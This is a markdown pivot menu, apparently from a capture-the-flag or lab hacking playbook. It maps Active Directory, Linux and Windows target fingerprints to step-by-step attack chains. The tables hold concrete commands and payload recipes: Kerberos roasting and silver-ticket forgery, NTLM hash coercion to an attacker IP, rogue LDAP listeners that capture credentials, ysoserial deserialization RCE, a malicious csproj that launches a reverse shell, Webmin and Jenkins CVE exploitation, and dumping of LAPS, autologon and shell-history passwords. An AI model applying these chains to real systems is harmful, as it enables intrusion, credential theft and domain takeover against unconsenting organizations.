# Foothold Patterns — Pivot Menu

When a target's surface presents one of these signatures, here is the entry vector to try first. Each row maps a fingerprint to a vector to a deep-dive scenario file.

Hash-cracking against AS-REP / Kerberoast hashes recovered from the wire is **not** brute force. Wordlist-spraying live logins is.

## AD targets (port 389/445/53/135 + 80/443)

| Signature | Vector | Scenario |
|-----------|--------|----------|
| Public website with team / staff / about page | Username permutation → AS-REP roast (`GetNPUsers.py -no-pass -format hashcat`), crack offline (`-m 18200`) | [scenarios/ad/as-rep-roast.md](scenarios/ad/as-rep-roast.md) |
| Printer / MFP / copier admin panel with `ldap_host` field | Point at attacker LDAP listener (`nc -lvk 389`) → simple-bind capture of cleartext service-account password | [scenarios/ad/ldap-simple-bind-capture.md](scenarios/ad/ldap-simple-bind-capture.md) |
| Initial creds in `/machine/profile/<id>.info.info_status` | Use as-is — box author provided foothold | [scenarios/ad/platform-starter-creds.md](scenarios/ad/platform-starter-creds.md) |
| Anonymous / guest SMB share | Spider every readable share for `*.xlsx *.docx *.kdbx *.config *.ini *.bak`. Patch flipped magic bytes (PH→PK). Test both null bind and guest bind | [scenarios/ad/smb-share-credential-loot.md](scenarios/ad/smb-share-credential-loot.md) |
| Encrypted ZIP with PFX inside on unauth SMB share | Crack zip → unpack → crack PFX → openssl-split → `evil-winrm -S -c cert.pem -k key.pem` over WinRM 5986 | [scenarios/ad/winrm-cert-auth.md](scenarios/ad/winrm-cert-auth.md) |
| Marketing PDF in unauth SMB share with MSSQL trial creds | `pdftotext -layout` → low-priv MSSQL login → `xp_dirtree '\\<VPN_IP>\share'` coerces NetNTLMv2 → crack `-m 5600` → grep `ERRORLOG` for typed-as-username passwords → ADCS ESC1/ESC4 → root | [scenarios/ad/mssql-pdf-creds-to-adcs.md](scenarios/ad/mssql-pdf-creds-to-adcs.md) |
| Ansible Vault on SMB + PWM open-config UI | `ansible2john` + rockyou → PWM **config-manager** login (`/pwm/private/config/login`) → rewrite `ldap.serverUrls` → Python LDAP listener captures bindResponse-required AD svc creds → WinRM | [scenarios/ad/pwm-ldap-config-coercion.md](scenarios/ad/pwm-ldap-config-coercion.md) |
| Cert-auth fails with `KDC_ERR_PADATA_TYPE_NOSUPP` etc. | `certipy auth -pfx <file> -ldap-shell` (Schannel LDAPS-with-cert ignores SID/PKINIT) → `change_password` / `add_user_to_group "Domain Admins"` | [scenarios/ad/certipy-ldap-shell-fallback.md](scenarios/ad/certipy-ldap-shell-fallback.md) |
| Kerberos-only domain, NTLM disabled (STATUS_NOT_SUPPORTED everywhere) | `/tmp/krb5.conf` + `getTGT` + `KRB5CCNAME`, FQDN never IP, `sitecustomize.py` getaddrinfo monkey-patch. Forge silver ticket for `MSSQLSvc` SPN with `ticketer.py` → `mssqlclient.py -k -no-pass` → `xp_cmdshell` runs as DC$ | [scenarios/ad/kerberos-only-silver-ticket.md](scenarios/ad/kerberos-only-silver-ticket.md) |
| DNS-write rights + KCD-configured service | DNS A-record poison → custom HTTP NTLM listener (HTTP/1.1 keep-alive + dynamic Type 2 with echoed flags + AV pairs) → `hashcat -m 5600` → bloodyAD reads gMSA → `getST.py -spn <orig> -altservice cifs/<host>` → SMB to root | [scenarios/ad/gmsa-rbcd-altservice.md](scenarios/ad/gmsa-rbcd-altservice.md) |
| AS-REP roastable / Kerberoastable user from null bind LDAP / RPC enum | Roast → crack offline. Never wordlist-spray live logins | [scenarios/ad/as-rep-roast.md](scenarios/ad/as-rep-roast.md) |

## Linux non-AD targets

| Signature | Vector | Scenario |
|-----------|--------|----------|
| Custom .NET TCP protocol on unusual port returning ASCII command banners | Decompile listener (`ilspycmd`) → look for `Deserialize(` on `BinaryFormatter`/`LosFormatter`/`NetDataContractSerializer`/`ObjectStateFormatter` → `ysoserial.exe -g TextFormattingRunProperties -f BinaryFormatter -c '<cmd>' -o base64`. "Exception in target of invocation" = success | [scenarios/linux-privesc/dotnet-binaryformatter-rce.md](scenarios/linux-privesc/dotnet-binaryformatter-rce.md) |
| PHP page does `readfile($_GET[...])` with `php://filter` + `data://` available | `ambionics/cnext-exploit.py` (CVE-2024-2961) adapted to target's HTTP shape — RCE on glibc ≤ 2.39 from a passive read sink | [scenarios/linux-privesc/cnext-readfile-rce.md](scenarios/linux-privesc/cnext-readfile-rce.md) |
| Build-as-a-service web app accepts a Git URL | Host `pwn.csproj` with `<Target BeforeTargets="BeforeBuild"><Exec Command="powershell -EncodedCommand …"/>` via `git update-server-info` + `python3 -m http.server`. `Start-Process` to detach reverse shell | [scenarios/linux-privesc/msbuild-git-clone-rce.md](scenarios/linux-privesc/msbuild-git-clone-rce.md) |
| Writable webroot + zip-as-other-user backup timer | Symlink home dir into webroot — info-zip 3.0 follows symlinks, archives `~/.ssh/id_rsa` etc. Read next backup zip | [scenarios/linux-privesc/zip-symlink-follow.md](scenarios/linux-privesc/zip-symlink-follow.md) |
| `sudo NOPASSWD` for `fail2ban restart` + group-writable `/etc/fail2ban/action.d/` | Replace the active banaction's `iptables-multiport.conf` (keep `<iptables>` substitutions intact) and append `cp /root/<flag> /tmp/...; chmod 644 ...` to `actionban`. Restart, trigger SSH bruteforce → root payload runs on first ban | [scenarios/linux-privesc/fail2ban-action-hijack.md](scenarios/linux-privesc/fail2ban-action-hijack.md) |
| Webmin 1.881–1.920 on TCP/10000 + valid PAM-mapped user | CVE-2019-12840 — `package-updates/update.cgi` interpolates `$update` into `$cmd` *before* `quotemeta` is applied. POST `mode=new&u=<inj>&confirm=1` with `Referer:` header (Webmin's `referers_none=1` gate). Bypass `split('/')` truncation in the package-name parse with `$(printf '\57…\57…')` octal `/` | [scenarios/linux-privesc/webmin-packageup-rce.md](scenarios/linux-privesc/webmin-packageup-rce.md) |
| User foothold has `~/.vault-token` + Vault SSH OTP role on `127.0.0.1` | `vault write -field=key ssh/creds/<role> ip=127.0.0.1` produces a single-use SSH password. SSH from the foothold (not external) with `PreferredAuthentications=keyboard-interactive,password`. If `sshpass`/`expect` are missing, drive the prompt with a stdlib `pty.fork()` helper | [scenarios/linux-privesc/vault-otp-ssh-role.md](scenarios/linux-privesc/vault-otp-ssh-role.md) |
| Schema-v1 ADCS template (`WebServer`, custom Server-Auth) + `EnrolleeSuppliesSubject` + you control an enroller | ESC15 / CVE-2024-49019 — smuggle `Client Authentication` into the cert via `-application-policies`, PKINIT as anyone. Watch for the certipy 5.0.4 CSR bug (multiple `extensionRequest` attrs → AD CS drops App Policies) and the patched-KDC failure mode (`KDC_ERR_INCONSISTENT_KEY_PURPOSE`) | [scenarios/ad/adcs-esc15.md](scenarios/ad/adcs-esc15.md) |
| `cap_dac_override` binary that writes to `/proc/sys/fs/binfmt_misc/register` | Register binfmt handler with `C` flag matching unique ELF prefix of `/usr/bin/su` → kernel runs your interpreter (real ELF, not `#!`) with su's credentials → root | [scenarios/linux-privesc/binfmt-misc-c-flag.md](scenarios/linux-privesc/binfmt-misc-c-flag.md) |

## Windows non-AD (or post-foothold) targets

| Signature | Vector | Scenario |
|-----------|--------|----------|
| Jenkins on TCP/8080 | CVE-2024-23897 → `connect-node "@/var/jenkins_home/users/users.xml"` → per-user `config.xml` → crack `<passwordHash>#jbcrypt:` offline (rockyou: `princess` etc.) → Script Console Groovy `CredentialsProvider.lookupCredentials(...)` → SSH creds usually root | [scenarios/linux-privesc/jenkins-cve-2024-23897.md](scenarios/linux-privesc/jenkins-cve-2024-23897.md) |
| Jenkins web UI on any port (often `:8080` / `:50000` / non-standard prefix) with anonymous-readable dashboard | Hit `/<prefix>/script`. If the page renders without auth, anyone can run Groovy on the controller — `new File(path).text` reads files, `cmd.execute().text` runs commands, `CredentialsProvider.lookupCredentials(...)` dumps stored creds. Pull the CSRF crumb from `/crumbIssuer/api/xml` and POST to `/scriptText` | [scenarios/linux-privesc/jenkins-anon-script-console.md](scenarios/linux-privesc/jenkins-anon-script-console.md) |
| Winlogon registry on foothold host | `reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"` — `DefaultPassword` often cleartext autologon svc account. Cross-check `DefaultUserName` vs sAM (display name vs sAM truncation) → if `DS-Replication-Get-Changes-All` → DCSync immediately | [scenarios/windows-privesc/winlogon-defaultpassword.md](scenarios/windows-privesc/winlogon-defaultpassword.md) |
| Server Operators / Print Operators with filtered WinRM token | OpenSCManager 0x5 despite group SID → registry write `HKLM\Services\<svc>\ImagePath` + reboot via `SeRemoteShutdownPrivilege` | [scenarios/windows-privesc/server-operators-imagepath.md](scenarios/windows-privesc/server-operators-imagepath.md) |
| `SeBackupPrivilege` over WinRM | Dumps SAM+SYSTEM cleanly but local-Admin hash is **DSRM** — does NOT work over SMB/WinRM/LDAP. Pivot to ImagePath. NTDS.dit needs VSS/diskshadow (real admin) | [scenarios/windows-privesc/sebackupprivilege-pitfalls.md](scenarios/windows-privesc/sebackupprivilege-pitfalls.md) |
| ADCS template writable by chained ACL group (e.g. `Cert Publishers`) | ESC4 DACL flip → ESC1 reissue → PKINIT (or `-ldap-shell` Plan B) | [scenarios/ad/adcs-esc4-dacl-flip.md](scenarios/ad/adcs-esc4-dacl-flip.md) |
| `LAPS_Readers` / `*LAPS*` / IT-* group membership | Non-admin domain user reads every LAPS-managed machine's local Admin password as cleartext via LDAP (`ms-Mcs-AdmPwd` / `msLAPS-Password`). Single-DC env = DA in one query (`nxc ldap ... -M laps`) | [scenarios/ad/laps-group-membership-read.md](scenarios/ad/laps-group-membership-read.md) |
| Foothold on any Windows host | Sweep `C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt` — service-account passwords from PSCredential one-liners | [scenarios/windows-privesc/psreadline-history-sweep.md](scenarios/windows-privesc/psreadline-history-sweep.md) |
| `Everyone:F` on a service binary | Sanity-check before Potato: `sc qprivs <svc>` + drop a CGI running `whoami /priv`. RequiredPrivileges may strip SeImpersonate. XAMPP-on-Windows specifically: usually de-privileged worker | [scenarios/windows-privesc/service-required-privileges.md](scenarios/windows-privesc/service-required-privileges.md) |
| Multi-user Windows machine after admin | Sweep `C:\Users\*\Desktop\*.txt`, not just Administrator's Desktop — flag may live on any local Admin / DA member's profile | [scenarios/windows-privesc/multi-user-flag-sweep.md](scenarios/windows-privesc/multi-user-flag-sweep.md) |

## Operator gotchas

- **Clock skew breaks Kerberos.** Any Kerberos tool failure → check skew → prefix with `faketime`.
- **Internal subnets need tunneling.** Hyper-V (port 2179), dual NICs, internal IPs → Ligolo-ng or chisel.
- **Multi-flag chains.** User flag first, always. From user shell, enumerate for root (sudo -l, groups, SeBackupPrivilege, RODC access).
- **gpg-agent `General error` on macOS attacker host** with long `GNUPGHOME` paths — use `GNUPGHOME=/tmp/<short>` for one-off keystore decryption.

## Anti-patterns

- Brute-forcing live logins on AD when AS-REP / Kerberoast hashes are obtainable from the wire.
- Spraying rockyou against C2 passwords — bespoke C2 secrets are not in wordlists; recover from artifacts.
- Reaching for PrintSpoofer / GodPotato / RoguePotato before checking `sc qprivs` — RequiredPrivileges can strip SeImpersonate.
- Skipping the platform's `info_status` field — starter creds are sometimes provided directly.
